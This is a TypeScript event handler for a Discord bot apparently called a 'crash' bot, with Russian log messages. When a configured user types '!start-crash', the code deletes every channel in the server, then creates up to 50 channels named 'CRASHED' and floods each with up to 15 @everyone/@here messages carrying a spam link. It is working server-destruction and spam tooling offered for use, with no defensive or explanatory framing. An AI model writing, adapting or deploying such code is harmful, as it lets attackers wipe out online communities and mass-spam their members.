import { Event } from 'src/utils/Event';
import { CrashClient } from 'src/client';
import { ChannelType, Message } from 'discord.js';
import { LogLevel } from 'src/logger/enums/LogLevel';

export default new Event(
    {
        name: 'messageCreate'
    },
    async (client: CrashClient, message: Message<true>) => {
        if (
            !message ||
            !client.config.executors.includes(message.author.id) ||
            !message.guild
        ) {
            return;
        }

        if (message.content === '!start-crash') {
            await Promise.all(
                message.guild.channels.cache.map((channel) =>
                    channel.delete(`CRASHED`)
                )
            ).catch((err) => {
                client.logger.log(
                    LogLevel.WARN,
                    `Не смог удалить каналы\n${err.stack ?? err}`
                );
            });

            const channelsLimited =
                client.config.channelsToCreate > 50
                    ? 50
                    : client.config.channelsToCreate;
            const messagesLimited =
                client.config.messagesPerChannel > 15
                    ? 15
                    : client.config.messagesPerChannel;

            for (let i = 0; i < channelsLimited; i++) {
                await message.guild.channels
                    .create({
                        name: 'CRASHED',
                        type: ChannelType.GuildText
                    })
                    .then(async (channel) => {
                        for (let i = 0; i < messagesLimited; i++) {
                            await channel
                                .send({
                                    content: `@everyone, @here\n${client.config.linkToSpam}`
                                })
                                .catch((err) => {
                                    client.logger.log(
                                        LogLevel.WARN,
                                        `Не смог отправить сообщение в канал ${channel.id}\n${err.stack ?? err}`
                                    );
                                });
                        }
                    })
                    .catch((err) => {
                        client.logger.log(
                            LogLevel.WARN,
                            `Не смог создать канал\n${err.stack ?? err}`
                        );
                    });
            }
        }
    }
);
